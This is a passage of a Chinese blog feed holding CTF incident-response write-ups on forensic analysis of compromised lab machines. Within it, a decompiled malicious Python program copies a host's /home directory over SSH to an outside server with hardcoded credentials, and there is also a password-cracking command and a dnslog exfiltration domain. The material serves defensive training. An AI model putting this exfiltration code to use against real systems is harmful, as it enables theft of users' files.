class="string">&quot;c3a1c3c13e326020c3919093e1260525045e&quot;</span>, <span class="string">&quot;MySecretKey&quot;</span>))</span><br><span class="line"><span class="comment"># palu&#123;Password-000&#125;</span></span><br></pre></td></tr></table></figure><h3 id="应急响应2-24（复现）提交恶意维权软件的名称作为flag进行提交"><a href="#应急响应2-24（复现）提交恶意维权软件的名称作为flag进行提交" class="headerlink" title="应急响应2-24（复现）提交恶意维权软件的名称作为flag进行提交"></a>应急响应2-24（复现）提交恶意维权软件的名称作为flag进行提交</h3><p><code>palu&#123;svhost&#125;</code></p><p>还记得前面17题找到的恶意软件吗，就是他</p><h3 id="应急响应2-25-提交恶意程序的外联地址"><a href="#应急响应2-25-提交恶意程序的外联地址" class="headerlink" title="应急响应2-25 提交恶意程序的外联地址"></a>应急响应2-25 提交恶意程序的外联地址</h3><p><code>palu&#123;88.173.90.103&#125;</code></p><p>在近源机器机器中还有一个恶意程序，在Parloo用户的家目录下名称为<code>ifconfig.exe</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-72.png"></p><p>一个经典Pyinstaller打包的Python程序，逆向出来后即可看到外连IP</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-73.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: 恶意程序1.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.8.0rc1+ (3413)</span></span><br><span class="line"><span class="comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> scp <span class="keyword">import</span> SCPClient</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ssh_client</span>(<span class="params">server, port, username, password=<span class="literal">None</span>, key_path=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    创建SSH客户端连接</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> key_path:</span><br><span class="line">            private_key = paramiko.RSAKey.from_private_key_file(key_path)</span><br><span class="line">            client.connect(server, port, username, pkey=private_key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            client.connect(server, port, username, password)</span><br><span class="line">        <span class="keyword">return</span> client</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;连接错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transfer_directory</span>(<span class="params">scp, local_path, remote_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    递归传输目录</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> os.listdir(local_path):</span><br><span class="line">        local_item = os.path.join(local_path, item)</span><br><span class="line">        <span class="keyword">if</span> os.path.islink(local_item):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;跳过符号链接: <span class="subst">&#123;local_item&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        remote_item = os.path.join(remote_path, item)</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(local_item):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                scp.mkdir(remote_item)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            transfer_directory(scp, local_item, remote_item)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;传输文件中: <span class="subst">&#123;local_item&#125;</span>&#x27;</span>)</span><br><span class="line">            scp.put(local_item, remote_item)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ssh_config = &#123;<span class="string">&#x27;server&#x27;</span>: <span class="string">&#x27;88.173.90.103&#x27;</span>, <span class="string">&#x27;port&#x27;</span>: <span class="number">22</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;ubuntu&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;OOWPWPWADADA&#x27;</span>&#125;</span><br><span class="line">    local_home = <span class="string">&#x27;/home&#x27;</span></span><br><span class="line">    remote_base = <span class="string">&#x27;/home/ubuntu/backup_home&#x27;</span></span><br><span class="line">    ssh = create_ssh_client(**ssh_config)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ssh:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> SCPClient(ssh.get_transport()) <span class="keyword">as</span> scp:</span><br><span class="line">            Path(local_home).mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">            transfer_directory(scp, local_home, remote_base)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;传输完成&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;传输错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        ssh.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="应急响应2-26-提交攻击这使用的恶意dnslog域名作为flag进行提交"><a href="#应急响应2-26-提交攻击这使用的恶意dnslog域名作为flag进行提交" class="headerlink" title="应急响应2-26 提交攻击这使用的恶意dnslog域名作为flag进行提交"></a>应急响应2-26 提交攻击这使用的恶意dnslog域名作为flag进行提交</h3><p><code>palu&#123;np85qqde.requestrepo.com&#125;</code></p><p>还记得前面第20题找到的<code>command.log</code>日志文件吗</p><p>在日志里面就可以找到</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-74.png"></p><h3 id="应急响应2-27-提交寻找反序列化漏洞的端口作为flag进行提交"><a href="#应急响应2-27-提交寻找反序列化漏洞的端口作为flag进行提交" class="headerlink" title="应急响应2-27 提交寻找反序列化漏洞的端口作为flag进行提交"></a>应急响应2-27 提交寻找反序列化漏洞的端口作为flag进行提交</h3><p><code>palu&#123;9999&#125;</code></p><p>在WAF中筛选具有反序列化攻击的流量</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-75.png"></p><p>就这段流量是响应302，其他都是响应404或400</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-76.png"></p><h3 id="应急响应2-28（复现）提交web服务泄露的密钥作为flag进行提交链接"><a href="#应急响应2-28（复现）提交web服务泄露的密钥作为flag进行提交链接" class="headerlink" title="应急响应2-28（复现）提交web服务泄露的密钥作为flag进行提交链接"></a>应急响应2-28（复现）提交web服务泄露的密钥作为flag进行提交链接</h3><p><code>palu&#123;QZYysgMYhG6/CzIJlVpR2g==&#125;</code></p><p>在WAF的防护应用可以看到<code>192.168.20.102:9999</code>是代理了<code>192.168.20.103:9999</code>的服务</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-77.png"></p><p>然而在对应的1Panel管理面板中并没有看到开启了端口为9999的站点</p><p>使用ss命令查看Server服务器网络情况，并根据PID找到占用9999端口的程序</p><p>不用ss命令也可以装net-tools用netstat命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ss -anotp | grep <span class="string">&quot;9999&quot;</span></span><br><span class="line">ps -ef | grep <span class="string">&quot;844&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-78.png"></p><p>可以找到占用的程序为<code>/opt/adminAF.jar</code></p><p>拉出来用<code>Java Decompiler</code>看源码就能找到泄露的密钥</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-79.png"></p><h3 id="应急响应2-29（复现）提交攻击者开始攻击的时间作为flag进行提交"><a href="#应急响应2-29（复现）提交攻击者开始攻击的时间作为flag进行提交" class="headerlink" title="应急响应2-29（复现）提交攻击者开始攻击的时间作为flag进行提交"></a>应急响应2-29（复现）提交攻击者开始攻击的时间作为flag进行提交</h3><p>找了很多师傅的WP都没看到正确答案故后续等官方WP</p><h3 id="应急响应2-30-提交攻击者在server中留下的账户密码作为flag进行提交"><a href="#应急响应2-30-提交攻击者在server中留下的账户密码作为flag进行提交" class="headerlink" title="应急响应2-30 提交攻击者在server中留下的账户密码作为flag进行提交"></a>应急响应2-30 提交攻击者在server中留下的账户密码作为flag进行提交</h3><p><code>palu&#123;parloohack/123456&#125;</code></p><p>查看<code>/etc/passwd</code>可以看到攻击者留下的账号</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-80.png"></p><p>合并/etc/passwd和/etc/shadow文件然后用john爆破就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-81.png"></p><h3 id="应急响应2-31（复现）提交攻击者维权方法的名称作为flag进行提交"><a href="#应急响应2-31（复现）提交攻击者维权方法的名称作为flag进行提交" class="headerlink" title="应急响应2-31（复现）提交攻击者维权方法的名称作为flag进行提交"></a>应急响应2-31（复现）提交攻击者维权方法的名称作为flag进行提交</h3><p><code>palu&#123;parloohack_script.service&#125;</code></p><p>在server机中切换到<code>parloohack</code>用户查看执行命令的历史记录中可以看到</p><p>攻击者新增并启动了一个特别的服务，还增加了自启动</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-82.png"></p><p>查看该服务可以发现启动了<code>/home/parloohack/python3.3.py</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-83.png"></p><p>继续分析<code>/home/parloohack/python3.3.py</code>发现是很明显的维权方法</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-84.png"></p><p>所以flag就是<code>parloohack_script.service</code></p><h3 id="应急响应2-32-提交攻击者留下的木马md5后作为flag进行提交"><a href="#应急响应2-32-提交攻击者留下的木马md5后作为flag进行提交" class="headerlink" title="应急响应2-32 提交攻击者留下的木马md5后作为flag进行提交"></a>应急响应2-32 提交攻击者留下的木马md5后作为flag进行提交</h3><p><code>palu&#123;4123940b3911556d4bf79196cc008bf4&#125;</code></p><p>在<code>parloohack</code>用户的家目录下可以看到一个特殊的文件<code>aa</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-85.png"></p><p>扔沙箱就可以发现是木马</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-86.png"></p><h3 id="应急响应2-33（复现）提交攻击者留下的溯源信息作为flag进行提交"><a href="#应急响应2-33（复现）提交攻击者留下的溯源信息作为flag进行提交" class="headerlink" title="应急响应2-33（复现）提交攻击者留下的溯源信息作为flag进行提交"></a>应急响应2-33（复现）提交攻击者留下的溯源信息作为flag进行提交</h3><p><code>palu&#123;X5E1yklz1oAdyHBZ&#125;</code></p><p>在PC2的浏览器的密码管理器中可以找到攻击者留下的溯源信息（这是真没想到）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-87.png"></p><h3 id="应急响应2-34（复现）提交攻击者的githubID作为flag进行提交"><a href="#应急响应2-34（复现）提交攻击者的githubID作为flag进行提交" class="headerlink" title="应急响应2-34（复现）提交攻击者的githubID作为flag进行提交"></a>应急响应2-34（复现）提交攻击者的githubID作为flag进行提交</h3><p><code>palu&#123;&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ParlooSEc&lt;/font&gt;&#125;</code></p><p>这个用户登录的账号是一个QQ号</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-88.png"></p><p>去他的QQ空间中查看就可以知道Github的ID为<code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ParlooSEc来点str吧&lt;/font&gt;</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-89.png"></p><p>但是找不到用户为<code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ParlooSEc来点str吧&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">直到试了</font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ParlooSEc&lt;/font&gt;</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-90.png"></p><h3 id="应急响应2-35（复现）提交攻击者在github下留下的的内容作为flag进行提交"><a href="#应急响应2-35（复现）提交攻击者在github下留下的的内容作为flag进行提交" class="headerlink" title="应急响应2-35（复现）提交攻击者在github下留下的的内容作为flag进行提交"></a>应急响应2-35（复现）提交攻击者在github下留下的的内容作为flag进行提交</h3><p><code>palu&#123;s5o3WkX33hptyJjk&#125;</code></p><p>在GitHub中看他的<code>fffflllgggg</code>项目就可以看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-91.png"></p><h3 id="应急响应2-36-提交恶意用户的数量作为flag进行提交"><a href="#应急响应2-36-提交恶意用户的数量作为flag进行提交" class="headerlink" title="应急响应2-36 提交恶意用户的数量作为flag进行提交"></a>应急响应2-36 提交恶意用户的数量作为flag进行提交</h3><p><code>palu&#123;99&#125;</code></p><p>进不去虚拟机是正常的，被攻击者改了密码，可以参考该文章清掉密码：</p><p><a href="https://blog.csdn.net/weixin_52244898/article/details/138998529">https://blog.csdn.net/weixin_52244898/article/details/138998529</a></p><p>打开PC01的显示隐藏文件夹即可在C盘看到一个脚本，里面创建了99个恶意用户</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-92.png"></p><h3 id="应急响应2-37-提交恶意用户的默认密码作为flag进行提交"><a href="#应急响应2-37-提交恶意用户的默认密码作为flag进行提交" class="headerlink" title="应急响应2-37 提交恶意用户的默认密码作为flag进行提交"></a>应急响应2-37 提交恶意用户的默认密码作为flag进行提交</h3><p><code>palu&#123;123456&#125;</code></p><p>在上一题即可看到都是默认密码为123456</p><h3 id="应急响应2-38-提交业务数据中攻击者留下的信息作为flag进行提交"><a href="#应急响应2-38-提交业务数据中攻击者留下的信息作为flag进行提交" class="headerlink" title="应急响应2-38 提交业务数据中攻击者留下的信息作为flag进行提交"></a>应急响应2-38 提交业务数据中攻击者留下的信息作为flag进行提交</h3><p><code>palu&#123;crP1ZIVfqrkfdhGy&#125;</code></p><p>我是直接在server服务器中的1Panel面板中备份整个数据库下载下来然后搜索palu抢到三血的</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-93.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-94.png"></p><h3 id="应急响应2-39-提交私人git仓库中留下的内容作为flag进行提交"><a href="#应急响应2-39-提交私人git仓库中留下的内容作为flag进行提交" class="headerlink" title="应急响应2-39 提交私人git仓库中留下的内容作为flag进行提交"></a>应急响应2-39 提交私人git仓库中留下的内容作为flag进行提交</h3><p><code>palu&#123;FO65SruuTukdpBS5&#125;</code></p><p>在gitea的palu仓库里</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-95.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-96.png"></p><h3 id="应急响应2-40（复现）提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交"><a href="#应急响应2-40（复现）提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交" class="headerlink" title="应急响应2-40（复现）提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交"></a>应急响应2-40（复现）提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交</h3><p><code>palu&#123;ba7c9fc1ff58b48d0df5c88d2fcc5cd1&#125;</code></p><p>找了我大半天，结果就是被我扔到沙箱中检测不出恶意的<code>.a</code>文件（哭死）</p><p>在root用户的历史命令记录中可以看到一直在编辑<code>.a</code>文件</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-97.png"></p><p>全局搜索找到该文件</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-98.png"></p><p>我把程序扔到云沙箱中检测不到恶意所以我直接忽略了这个文件（看来不能完全相信沙箱的检测结果 哭）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-99.png"></p><h3 id="应急响应2-41（复现）提交恶意程序中模拟c2通信的函数名称作为flag进行提交"><a href="#应急响应2-41（复现）提交恶意程序中模拟c2通信的函数名称作为flag进行提交" class="headerlink" title="应急响应2-41（复现）提交恶意程序中模拟c2通信的函数名称作为flag进行提交"></a>应急响应2-41（复现）提交恶意程序中模拟c2通信的函数名称作为flag进行提交</h3><p><code>palu&#123;simulate_network_communication&#125;</code></p><p>扔进IDA就发现了为什么沙箱检测为安全了，全是模拟的函数（他真的我哭死）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-100.png"></p><p>模拟通讯的函数就是<code>simulate_network_communication</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-101.png"></p><h3 id="应急响应2-42（复现）提交恶意程序创建隐藏文件的名称作为flag提交"><a href="#应急响应2-42（复现）提交恶意程序创建隐藏文件的名称作为flag提交" class="headerlink" title="应急响应2-42（复现）提交恶意程序创建隐藏文件的名称作为flag提交"></a>应急响应2-42（复现）提交恶意程序创建隐藏文件的名称作为flag提交</h3><p><code>palu&#123;.malware_log.txt&#125;</code></p><p>在<code>create_hidden_file</code>函数里面</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-102.png"></p><h3 id="应急响应2-43（复现）提交恶意程序中模拟权限提升的函数作为flag进行提交"><a href="#应急响应2-43（复现）提交恶意程序中模拟权限提升的函数作为flag进行提交" class="headerlink" title="应急响应2-43（复现）提交恶意程序中模拟权限提升的函数作为flag进行提交"></a>应急响应2-43（复现）提交恶意程序中模拟权限提升的函数作为flag进行提交</h3><p><code>palu&#123;simulate_privilege_escalation&#125;</code></p><p>就是函数<code>simulate_privilege_escalation</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-103.png"></p><p>吐槽：白给4题我真服了<del>_</del></p><h3 id="应急响应2-44-提交被钓鱼上线的用户名作为flag进行提交"><a href="#应急响应2-44-提交被钓鱼上线的用户名作为flag进行提交" class="headerlink" title="应急响应2-44 提交被钓鱼上线的用户名作为flag进行提交"></a>应急响应2-44 提交被钓鱼上线的用户名作为flag进行提交</h3><p><code>palu&#123;Parloo-子怡&#125;</code></p><p>在内网通的聊天记录中可以看到PC01是单独给PC02发了一个恶意程序的</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-104.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-105.png"></p><h3 id="应急响应2-45-提交恶意程序的所在路径作为flag进行提交"><a href="#应急响应2-45-提交恶意程序的所在路径作为flag进行提交" class="headerlink" title="应急响应2-45 提交恶意程序的所在路径作为flag进行提交"></a>应急响应2-45 提交恶意程序的所在路径作为flag进行提交</h3><p><code>palu&#123;C:\Users\Public\Nwt\cache\recv\Parloo-沉沉&#125;</code></p><p>看上一题就能知道路径</p><h3 id="应急响应2-46-分析恶意程序的反连地址作为flag进行提交"><a href="#应急响应2-46-分析恶意程序的反连地址作为flag进行提交" class="headerlink" title="应急响应2-46 分析恶意程序的反连地址作为flag进行提交"></a>应急响应2-46 分析恶意程序的反连地址作为flag进行提交</h3><p><code>palu&#123;47.101.213.153&#125;</code></p><p>还记得在前面33题找到保存了的账号密码吗，保存的就是恶意程序的反连地址的账号于密码</p><p>因为这个恶意程序加了UPX的壳，还只能手工脱壳且在会检测云沙箱环境，作者比较菜所以没有手工脱壳分析</p><p>所以我是放在物理机中运行恶意程序然后用火绒安全工具获得的反连地址（危险操作请勿模仿）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-106.png"></p><p>正确操作</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-107.png"></p><h3 id="应急响应2-47（复现）提交恶意c2的服务器登录的账号密码作为flag进行提交"><a href="#应急响应2-47（复现）提交恶意c2的服务器登录的账号密码作为flag进行提交" class="headerlink" title="应急响应2-47（复现）提交恶意c2的服务器登录的账号密码作为flag进行提交"></a>应急响应2-47（复现）提交恶意c2的服务器登录的账号密码作为flag进行提交</h3><p><code>palu&#123;admin/admin@qwer&#125;</code></p><p>就是浏览器保存的C2地址中的账号密码</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-108.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025年Solar应急响应公益月赛-4月 Writeup</title>
      <link href="/blog/2025/04/28/CTF-WP/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-4%E6%9C%88/"/>
      <url>/blog/2025/04/28/CTF-WP/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-4%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<h2 id="应急行动-1"><a href="#应急行动-1" class="headerlink" title="应急行动-1"></a>应急行动-1</h2><p>利用取证大师分析VM虚拟机镜像</p><p>分析Apache日志，发现多次访问了<code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;AgentBoard.XGI&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">这个路径</font></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-0.png"></p><p>搜了一下，发现是<code>瑞友天翼应用虚拟化系统RCE漏洞</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-1.png"></p><p>继续分析所有访问这个路径的IP</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-2.png"></p><p>在第312行日志中发现写了一个一句话木马</p><p>所以flag为<code>flag&#123;192.168.56.128 21/04/2025&#125;</code></p><h2 id="应急行动-2（复现）"><a href="#应急行动-2（复现）" class="headerlink" title="应急行动-2（复现）"></a>应急行动-2（复现）</h2><p>从取证大师中可以看到，攻击者下载了Edge浏览器，在下载历史可以看到下载了<code>rclone</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-3.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-4.png"></p><p>rclone可以挂载网盘，结合题目说的流量异常，很大可能为攻击者用来窃取数据用的（我居然没有留意该软件是干嘛的）</p><p>所以在<code>rclone.conf</code>的配置文件中找到flag</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-5.png"></p><p><code>flag&#123;oisienfpqwlmdouydrsbhuisjAUGEDW&#125;</code></p><h2 id="应急行动-3"><a href="#应急行动-3" class="headerlink" title="应急行动-3"></a>应急行动-3</h2><p>在取证大师中查看该文件的朔源</p><p><code>C:\Program Files (x86)\RealFriend\Rap Server\WebRoot\casweb\Home\View\Index\index.html</code></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-6.png"></p><p>在<code>2025-04-21 23:39:28</code>发现变更</p><p>所以flag为<code>flag&#123;2025-04-21 23:39:28&#125;</code></p><h2 id="应急行动-4"><a href="#应急行动-4" class="headerlink" title="应急行动-4"></a>应急行动-4</h2><p>flag1{zheshi}</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-7.png"></p><p>flag2{yige}</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-8.png"></p><p>flag{ni}</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-9.png"></p><p>flag4{xiangbudaodeflag}</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-10.png"></p><p>最终flag为<code>flag&#123;zheshiyigenixiangbudaodeflag&#125;</code></p><h2 id="应急行动-5（复现）"><a href="#应急行动-5（复现）" class="headerlink" title="应急行动-5（复现）"></a>应急行动-5（复现）</h2><p>通过题目提示知道要找的是加密程序，在真实的应急响应中，寻找加密器主要通过加密文件的修改时间、加密器常见路径(启动项，music，temp，users等目录下)、常见的加密器名称等线索排查加密器，在这里我们可以上传一个everything方便查找，可以看到一个名为Encryptor123的程序，很明显这就是我们要找的目标。</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-11.png"></p><p><code>flag&#123;Encryptor123.exe&#125;</code></p><h2 id="可疑文件"><a href="#可疑文件" class="headerlink" title="可疑文件"></a>可疑文件</h2><p>直接把dll扔进IDA</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-12.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-13.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-14.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-15.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-16.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_18007ABE0(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  char *v2; // rdi</span><br><span class="line">  __int64 i; // rcx</span><br><span class="line">  _BYTE v5[32]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line">  char v6; // [rsp+20h] [rbp+0h] BYREF</span><br><span class="line">  int v7; // [rsp+30h] [rbp+10h] BYREF</span><br><span class="line">  _BYTE v8[4]; // [rsp+34h] [rbp+14h] BYREF</span><br><span class="line">  _BYTE v9[4]; // [rsp+38h] [rbp+18h] BYREF</span><br><span class="line">  _BYTE v10[4]; // [rsp+3Ch] [rbp+1Ch] BYREF</span><br><span class="line">  _BYTE v11[4]; // [rsp+40h] [rbp+20h] BYREF</span><br><span class="line">  _BYTE v12[4]; // [rsp+44h] [rbp+24h] BYREF</span><br><span class="line">  _BYTE v13[4]; // [rsp+48h] [rbp+28h] BYREF</span><br><span class="line">  _BYTE v14[4]; // [rsp+4Ch] [rbp+2Ch] BYREF</span><br><span class="line">  _BYTE v15[4]; // [rsp+50h] [rbp+30h] BYREF</span><br><span class="line">  _BYTE v16[4]; // [rsp+54h] [rbp+34h] BYREF</span><br><span class="line">  _BYTE v17[4]; // [rsp+58h] [rbp+38h] BYREF</span><br><span class="line">  _BYTE v18[4]; // [rsp+5Ch] [rbp+3Ch] BYREF</span><br><span class="line">  _BYTE v19[4]; // [rsp+60h] [rbp+40h] BYREF</span><br><span class="line">  _BYTE v20[4]; // [rsp+64h] [rbp+44h] BYREF</span><br><span class="line">  _BYTE v21[4]; // [rsp+68h] [rbp+48h] BYREF</span><br><span class="line">  _BYTE v22[24]; // [rsp+6Ch] [rbp+4Ch] BYREF</span><br><span 